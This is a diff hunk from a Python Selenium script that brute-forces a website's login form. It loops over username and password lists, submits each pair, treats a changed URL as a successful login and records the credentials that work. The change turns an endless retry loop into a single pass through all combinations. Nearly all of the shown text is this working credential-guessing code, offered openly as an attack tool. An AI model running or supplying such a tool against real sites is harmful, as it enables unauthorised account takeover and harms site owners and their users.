@@ -80,29 +80,29 @@ if proceed == "y":
 	time.sleep(3)
 	print(f"[+] {TARGET_URL} retrieved. Currently attempting to brute login...")
 
-	while True:
-		try:
-			for username in username_list:
-				driver.find_element(By.XPATH, LOGIN_XPATH).send_keys(username)
-				time.sleep(1)  # Adjust sleep timers as needed
-				for password in password_list:
-					driver.find_element(By.XPATH, PW_XPATH).send_keys(password)
-					time.sleep(1)
-					driver.find_element(By.XPATH, LOGIN_BUTTON_XPATH).click()
-					time.sleep(1)
-					# If the target URL does not change then script assumes login failed and tries again
-					# This may not always work depending on the app
-					if driver.current_url == TARGET_URL:
-						pass
-					else:
-						print(f"[+] Positive Response to: USERNAME = {username} & PASSWORD = {password}")
-						POSSIBLE_LOGINS.append({"Username": username, "Password": password})
-						driver.quit()  # Quit browser session and reopen new window to attempt new login
-						driver = webdriver.Chrome(executable_path=CHROME_DRIVER_PATH)
-						driver.get(url=TARGET_URL)  # Redirect to login page
-						time.sleep(3)
-		except TimeoutError:
-			pass
+	# Run through all username and password combinations
+	try:
+		for username in username_list:
+			driver.find_element(By.XPATH, LOGIN_XPATH).send_keys(username)
+			time.sleep(1)  # Adjust sleep timers as needed
+			for password in password_list:
+				driver.find_element(By.XPATH, PW_XPATH).send_keys(password)
+				time.sleep(1)
+				driver.find_element(By.XPATH, LOGIN_BUTTON_XPATH).click()
+				time.sleep(1)
+				# If the target URL does not change then script assumes login failed and tries again
+				# This may not always work depending on the app
+				if driver.current_url == TARGET_URL:
+					pass
+				else:
+					print(f"[+] Positive Response to: USERNAME = {username} & PASSWORD = {password}")
+					POSSIBLE_LOGINS.append({"Username": username, "Password": password})
+					driver.quit()  # Quit browser session and reopen new window to attempt new login
+					driver = webdriver.Chrome(executable_path=CHROME_DRIVER_PATH)
+					driver.get(url=TARGET_URL)  # Redirect to login page
+					time.sleep(3)
+	except TimeoutError:
+		pass
 elif proceed == "n":
 	print("[+] Brute force login canceled. Exiting from script...")
 	exit()
